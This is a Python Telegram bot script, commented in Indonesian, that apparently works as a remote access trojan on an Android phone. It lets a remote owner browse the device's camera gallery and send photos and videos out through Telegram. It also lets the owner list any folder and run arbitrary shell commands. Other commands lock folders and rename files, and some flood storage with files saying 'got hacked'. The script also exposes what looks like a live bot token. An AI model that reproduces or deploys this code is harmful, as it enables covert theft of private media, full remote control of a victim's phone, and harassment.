import telebot
import os
import random
import subprocess
import re
import string

BOT_TOKEN = '7946256405:AAERBAEQ5GXmiYtcVc2FWUU6pRywwczTXIc'
OWNER_ID = 6315300476

bot = telebot.TeleBot(BOT_TOKEN)

galeri_index = {}  # Menyimpan ID file untuk akses cepat

def is_owner(message):
    return message.chat.id == OWNER_ID

def escape_md(text):
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', text)

# 1. Buat 100 Folder
@bot.message_handler(commands=['buatfolder'])
def buat_folder_batch(message):
    if is_owner(message):
        try:
            base_path = "/sdcard/Kena Hack Bang"
            for i in range(1, 101):
                folder_path = f"{base_path}_{i}"
                if not os.path.exists(folder_path):
                    os.makedirs(folder_path)
            bot.send_message(message.chat.id, "✅ 100 folder berhasil dibuat!")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Gagal membuat folder: {escape_md(str(e))}", parse_mode="MarkdownV2")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")

# 2. Kirim Daftar Galeri (Foto & Video)
@bot.message_handler(commands=['galeri'])
def kirim_daftar_galeri(message):
    if is_owner(message):
        path = "/sdcard/DCIM/Camera"
        try:
            files = [f for f in os.listdir(path) if f.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mov'))]

            if not files:
                bot.send_message(message.chat.id, "📁 Tidak ada file media di galeri.")
                return

            galeri_index.clear()
            pesan = ""
            count = 0

            for f in sorted(files, reverse=True):
                fid = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
                galeri_index[fid] = f

                safe_filename = escape_md(f)
                pesan += f"📎 {safe_filename} — ID: `{fid}`\n"
                count += 1

                if count % 40 == 0:
                    bot.send_message(message.chat.id, pesan, parse_mode="MarkdownV2")
                    pesan = ""

            if pesan:
                bot.send_message(message.chat.id, pesan, parse_mode="MarkdownV2")

            bot.send_message(message.chat.id, f"📸 Total file: {len(files)}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {escape_md(str(e))}", parse_mode="MarkdownV2")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")

# 3. Ambil file galeri berdasarkan ID

@bot.message_handler(commands=['getfile'])
def get_file_by_id(message):
    if not is_owner(message):
        bot.send_message(message.chat.id, "❌ Akses ditolak.")
        return

    try:
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "❗ Gunakan format: /getfile <file_id>")
            return

        file_id = args[1]

        if file_id not in galeri_index:
            bot.send_message(message.chat.id, "❗ ID file tidak ditemukan.")
            return

        filename = galeri_index[file_id]
        filepath = os.path.join("/sdcard/DCIM/Camera", filename)

        if not os.path.isfile(filepath):
            bot.send_message(message.chat.id, "❗ File tidak ditemukan.")
            return

        ext = filename.lower().split('.')[-1]

        if ext in ['jpg', 'jpeg', 'png']:
            with open(filepath, 'rb') as photo:
                bot.send_photo(message.chat.id, photo, timeout=60)

        elif ext in ['mp4', 'mov']:
            with open(filepath, 'rb') as video:
                bot.send_video(message.chat.id, video, timeout=60)

        else:
            with open(filepath, 'rb') as doc:
                bot.send_document(message.chat.id, doc, timeout=60)

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: `{e}`", parse_mode="Markdown")

# 4. Putar Musik MP3 di folder Music
@bot.message_handler(commands=['playmusik'])
def play_musik(message):
    if is_owner(message):
        path = "/sdcard/Music"
        try:
            musik = [f for f in os.listdir(path) if f.endswith(".mp3")]
            if musik:
                file = os.path.join(path, musik[0])
                os.system(f'play-audio "{file}"')
                bot.send_message(message.chat.id, f"🎵 Memutar:\n{musik[0]}")
            else:
                bot.send_message(message.chat.id, "🎵 Tidak ada file musik di folder.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Gagal: {e}")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")
# 5. Kunci file target.txt dengan rename jadi .lock
@bot.message_handler(commands=['kuncifile'])
def kunci_file(message):
    if is_owner(message):
        target = "/sdcard/Download/target.txt"
        if os.path.exists(target):
            newname = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".lock"
            newpath = f"/sdcard/Download/{newname}"
            os.rename(target, newpath)
            bot.send_message(message.chat.id, f"🔒 File dikunci/diubah: {newpath}")
        else:
            bot.send_message(message.chat.id, "❗ File tidak ditemukan.")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")

# 6. Ls Daftar Penyimpanan
@bot.message_handler(commands=['ls'])
def ls_command(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")
        return

    # Ambil argumen path setelah /ls
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❗ Gunakan: /ls <path>")
        return

    path = parts[1]

    if not os.path.exists(path):
        bot.send_message(message.chat.id, f"❗ Folder tidak ditemukan: {path}")
        return

    if not os.path.isdir(path):
        bot.send_message(message.chat.id, f"❗ Bukan folder: {path}")
        return

    try:
        files = os.listdir(path)
        if not files:
            bot.send_message(message.chat.id, f"📁 Folder kosong: {path}")
            return

        hasil = f"📂 Isi folder {path}:\n"
        for f in files:
            full_path = os.path.join(path, f)
            if os.path.isdir(full_path):
                hasil += f"📁 {f}/\n"
            else:
                hasil += f"📄 {f}\n"

        # Kirim tanpa parse_mode
        bot.send_message(message.chat.id, hasil)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")
#Kunci Folder
@bot.message_handler(commands=['kuncifolder'])
def kunci_folder(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❗ Gunakan: /kuncifolder <path_folder>")
        return

    folder_path = parts[1]
    if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
        bot.send_message(message.chat.id, f"❗ Folder tidak ditemukan: {folder_path}")
        return

    try:
        os.system(f"chmod 000 '{folder_path}'")
        bot.send_message(message.chat.id, f"🔒 Folder berhasil dikunci: {folder_path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Gagal mengunci folder: {str(e)}")

#buka folder
@bot.message_handler(commands=['bukafolder'])
def buka_folder(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❗ Gunakan: /bukafolder <path_folder>")
        return

    folder_path = parts[1]
    if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
        bot.send_message(message.chat.id, f"❗ Folder tidak ditemukan: {folder_path}")
        return

    try:
        os.system(f"chmod 755 '{folder_path}'")
        bot.send_message(message.chat.id, f"🔓 Folder berhasil dibuka: {folder_path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Gagal membuka folder: {str(e)}")

#bikin file

@bot.message_handler(commands=['spamfile'])
def spam_file(message):
    if is_owner(message):
        try:
            parts = message.text.split()
            if len(parts) == 2 and parts[1].isdigit():
                jumlah = int(parts[1])
                if jumlah > 1000:
                    bot.send_message(OWNER_ID, "❗ Batas maksimal 1000 file ya bro 😅")
                    return
            else:
                jumlah = 10  # default kalau gak kasih angka

            folder_path = "/sdcard/HackMampus"
            os.makedirs(folder_path, exist_ok=True)

            for i in range(jumlah):
                file_path = os.path.join(folder_path, f"Kenak_Hack_Mampus_{i+1}.txt")
                with open(file_path, "w") as f:
                    f.write("Kena Hack Mampus")

            bot.send_message(OWNER_ID, f"✅ {jumlah} file berhasil dibuat di:\n📂 {folder_path}")
        except Exception as e:
            bot.send_message(OWNER_ID, f"❌ Error saat buat file: {e}")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak, hanya owner yang bisa pakai perintah ini.")

#Fitur Run
@bot.message_handler(commands=['run'])
def run_command(message):
    if is_owner(message):
        try:
            command = message.text[len('/run '):]  # Ambil teks setelah "/run "
            output = os.popen(command).read()[:4000]  # Batasin output biar nggak terlalu panjang
            if not output:
                output = "✅ Perintah dijalankan, tapi tidak ada output."
            bot.send_message(message.chat.id, f"💻 Output:\n{output}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")

# 7. Start command info
@bot.message_handler(commands=['start'])
def start(message):
    if is_owner(message):
        bot.send_message(OWNER_ID, "🤖 RayyBot aktif. Gunakan perintah:\n/buatfolder\n/galeri\n/getfile <id>\n/playmusik\n/kuncifile\n/ls\n/kuncifolder\n/bukafolder\n/spamfile\n/run")
    else:
        bot.send_message(message.chat.id, "❌ Akses ditolak.")

# Run bot
bot.polling()
